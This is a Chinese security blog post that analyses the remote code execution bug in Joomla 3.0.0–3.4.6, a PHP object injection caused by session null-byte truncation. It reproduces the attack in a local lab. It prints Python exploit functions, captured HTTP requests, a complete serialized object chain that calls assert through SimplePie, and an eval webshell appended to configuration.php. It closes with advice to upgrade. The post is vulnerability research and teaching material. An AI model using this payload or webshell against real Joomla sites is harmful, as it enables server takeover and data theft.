> 原文链接: https://www.anquanke.com//post/id/188177 


# Joomla 3.4.6远程代码执行漏洞原理分析和poc


                                阅读量   
                                **755774**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01f11476f6dbc3fcce.jpg)](https://p2.ssl.qhimg.com/t01f11476f6dbc3fcce.jpg)



## 事件背景

上周，意大利安全公司 Hacktive Security的研究员 Alessandro Groppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。

在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。



## 影响范围

Joomla 3.0.0 至 3.4.6



## 漏洞复现

1.安装部署

下载： [https://downloads.joomla.org/it/cms/joomla3/3-4-6](https://downloads.joomla.org/it/cms/joomla3/3-4-6)

浏览器访问 [http://127.0.0.1/Joomla/3.4.6/installation/index.php](http://127.0.0.1/Joomla/3.4.6/installation/index.php) 安装

注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现

安装成功

[![](https://p2.ssl.qhimg.com/t0184aeed409b3e82cc.png)](https://p2.ssl.qhimg.com/t0184aeed409b3e82cc.png)

[![](https://p5.ssl.qhimg.com/t01cd7778a482d81eb9.png)](https://p5.ssl.qhimg.com/t01cd7778a482d81eb9.png)

2.Exp复现

Exp地址:

[https://cxsecurity.com/issue/WLB-2019100045](https://cxsecurity.com/issue/WLB-2019100045)

脚本利用

[![](https://p4.ssl.qhimg.com/t01ca72914463bd18c3.png)](https://p4.ssl.qhimg.com/t01ca72914463bd18c3.png)

执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马

[![](https://p3.ssl.qhimg.com/t015ca8ca71c3696dee.png)](https://p3.ssl.qhimg.com/t015ca8ca71c3696dee.png)

可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接

caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功

[![](https://p1.ssl.qhimg.com/t01d1ad8b71c62c139f.png)](https://p1.ssl.qhimg.com/t01d1ad8b71c62c139f.png)



## Exp攻击链分析

目前互联网上公开的Exp地址:

[https://cxsecurity.com/issue/WLB-2019100045](https://cxsecurity.com/issue/WLB-2019100045)

通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。

[![](https://p1.ssl.qhimg.com/t01ed9eb4056cefcd1c.png)](https://p1.ssl.qhimg.com/t01ed9eb4056cefcd1c.png)

**1.获取Cookie**

代码:

[![](https://p3.ssl.qhimg.com/t01369e06447bcfd0d3.png)](https://p3.ssl.qhimg.com/t01369e06447bcfd0d3.png)

通过burpeuite抓到的请求包1

```
GET /Joomla/3.4.6/index.php/component/users HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

**2.获取csrf-token （关键步骤）**

代码：

```
def get_token(url, cook):
        token = ''
        resp = requests.get(url, cookies=cook, proxies = PROXS)
        html = BeautifulSoup(resp.text,'html.parser')
        # csrf token is the last input
        for v in html.find_all('input'):
                csrf = v
        csrf = csrf.get('name')
        return csrf
```

通过burpeuite抓到的请求包2：

```
GET /Joomla/3.4.6/index.php/component/users HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6;
```

主要是从返回包中提取 csrftoken

[![](https://p4.ssl.qhimg.com/t013bafdb4d12d6d41c.png)](https://p4.ssl.qhimg.com/t013bafdb4d12d6d41c.png)

3.生成payload 这里有2个payload

**后门的payload**

代码:

[![](https://p3.ssl.qhimg.com/t018d23827dce01e65c.png)](https://p3.ssl.qhimg.com/t018d23827dce01e65c.png)

利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下：

```
'if(isset($_POST['scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay'])) eval($_POST['scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay']);'
```

**反弹的payload**

[![](https://p3.ssl.qhimg.com/t014f48326ca0f27154.png)](https://p3.ssl.qhimg.com/t014f48326ca0f27154.png)

[![](https://p5.ssl.qhimg.com/t0170b281ef982fa3fe.png)](https://p5.ssl.qhimg.com/t0170b281ef982fa3fe.png)

4.发送带有写入webshell的请求

主要构造username,password,option,task,csrftoken等字段

```
def make_req(url , object_payload):
        # just make a req with object
        print_info('Getting Session Cookie ..')
        cook = get_cook(url)
        print_info('Getting CSRF Token ..')
        csrf = get_token( url, cook)

        user_payload = '\0\0\0' * 9
        padding = 'AAA' # It will land at this padding
        working_test_obj = 's:1:"A":O:18:"PHPObjectInjection":1:`{`s:6:"inject";s:10:"phpinfo();";`}`'
        clean_object = 'A";s:5:"field";s:10:"AAAAABBBBB' # working good without bad effects

        inj_object = '";'
        inj_object += object_payload
        inj_object += 's:6:"return";s:102:' # end the object with the 'return' part
        password_payload = padding + inj_object
        params = `{`
            'username': user_payload,
            'password': password_payload,
            'option':'com_users',
            'task':'user.login',
            csrf :'1'
            `}`

        print_info('Sending request ..')
        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
        return resp.text
```

下面是通过Burpsuite抓包获取的写入webshell的请求包3

```
POST /Joomla/3.4.6/index.php/component/users HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3
Content-Length: 1136
Content-Type: application/x-www-form-urlencoded

username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1

```

5.连接webshell测试是否写入成功

[![](https://p1.ssl.qhimg.com/t01c41149da3c4df1c4.png)](https://p1.ssl.qhimg.com/t01c41149da3c4df1c4.png)

通过burpeuite抓到的请求包4：

```
POST /Joomla/3.4.6//configuration.php HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B

```



## 漏洞分析

这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。

**1.溢出**

当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。

漏洞利用文件

‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。

由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘’替换‘x00x2ax00’(chr(0).’’.chr(0))，而在序列化对象中， $protected 变量被赋予‘x00x2ax00’前缀。

** [![](https://p4.ssl.qhimg.com/t0172a850d77d06da72.png)](https://p4.ssl.qhimg.com/t0172a850d77d06da72.png)**

当读取数据库中的数据时， read 函数会用‘x00x2ax00’（NN）替换‘’，重构原始对象。

[![](https://p2.ssl.qhimg.com/t0135f90532615cba3e.png)](https://p2.ssl.qhimg.com/t0135f90532615cba3e.png)

这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。<br>
如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。

**举个栗子**

比如一个登录表单，在 username 字段中放入‘myx00x2ax00username’，经过write函数处理后将在数据库中得到如下对象：

```
当该会话对象被 read 函数中读取时，‘’将被以如上所述方式所替代，得到如下值：
```s:8:s:"username";s:16:"myN*Nusername" --&gt;不合法的大小
```

被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！

就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。

在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。

**2. 对象注入（反序列化）** (本部分参考PHITHON的博客)

CVE-2015-8562的Poc如下

```
User-Agent: 123`}`__test|O:21:"JDatabaseDriverMysqli":3:`{`s:4:"a";O:17:"JSimplepieFactory":0:`{``}`s:21:"disconnectHandlers";a:1:`{`i:0;a:2:`{`i:0;O:9:"SimplePie":5:`{`s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:`{``}`s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";`}`i:1;s:4:"init";`}``}`s:13:"connection";i:1;`}`4
```

在这个执行链中，分别利用了如下类：

JDatabaseDriverMysqli

SimplePie

**2.1 JDatabaseDriverMysqli类**

我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：

```
&lt;?php
public function __destruct()
    `{`
        $this-&gt;disconnect();
    `}`
    ...
    public function disconnect()
    `{`
        // Close the connection.
        if ($this-&gt;connection)
        `{`
            foreach ($this-&gt;disconnectHandlers as $h)
            `{`
                call_user_func_array($h, array( &amp;$this));
            `}`

            mysqli_close($this-&gt;connection);
        `}`

        $this-&gt;connection = null;
    `}`

```

当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用**destruct，**destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。

但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。

于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), ‘init’]，传入call_user_func_array。

跟进init方法：

```
&lt;?php
function init()
    `{`
        // Check absolute bare minimum requirements.
        if ((function_exists('version_compare') &amp;&amp; version_compare(PHP_VERSION, '4.3.0', '&lt;')) || !extension_loaded('xml') || !extension_loaded('pcre'))
        `{`
            return false;
        `}`
        ...
        if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null)
        `{`
            $this-&gt;data = array();
            $this-&gt;multifeed_objects = array();
            $cache = false;

            if ($this-&gt;feed_url !== null)
            `{`
                $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url);
                // Decide whether to enable caching
                if ($this-&gt;cache &amp;&amp; $parsed_feed_url['scheme'] !== '')
                `{`
                    $cache = call_user_func(array($this-&gt;cache_class, 'create'), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), 'spc');

```

很明显，其中这两个call_user_func将是触发代码执行的元凶。

所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。

**2.2 SimplePie类**

默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：

[![](https://p4.ssl.qhimg.com/t01f77bceb29dffd587.png)](https://p4.ssl.qhimg.com/t01f77bceb29dffd587.png)

而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。

P牛的Poc

```
O:21:"JDatabaseDriverMysqli":3:`{`s:4:"a";O:17:"JSimplepieFactory":0:`{``}`s:21:"disconnectHandlers";a:1:`{`i:0;a:2:`{`i:0;O:9:"SimplePie":5:`{`s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:`{``}`s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";`}`i:1;s:4:"init";`}``}`s:13:"connection";i:1;`}`ð
```

前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了

选择用file_put_contents函数写入一句话到configuration.php中

```
file_put_contents('configuration.php','if(isset($_POST[\'test\'])) eval($_POST[\'test\']);', FILE_APPEND) || $a='http://wtf';
```

最终的对象如下：

```
AAA";s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:`{`s:4:"a";O:17:"JSimplepieFactory":0:`{``}`s:21:"disconnectHandlers";a:1:`{`i:0;a:2:`{`i:0;O:9:"SimplePie":5:`{`s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:`{``}`s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:217:"file_put_contents('configuration.php','if(isset($_POST['ja0k']))+eval($_POST['ja0k']);',+FILE_APPEND)+||+$a='http://wtf';";`}`i:1;s:4:"init";`}``}`s:13:"connection";i:1;`}`s:6:"return";s:102:

```



## 修复建议

更新至最新版本

官方地址[https://downloads.joomla.org](https://downloads.joomla.org)

**代码及工具下载：**

[https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE](https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE)

**免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。**

参考：<br>
[1].[https://cxsecurity.com/issue/WLB-2019100045](https://cxsecurity.com/issue/WLB-2019100045)<br>
[2].[https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html](https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html)<br>
[3].[https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA](https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA)
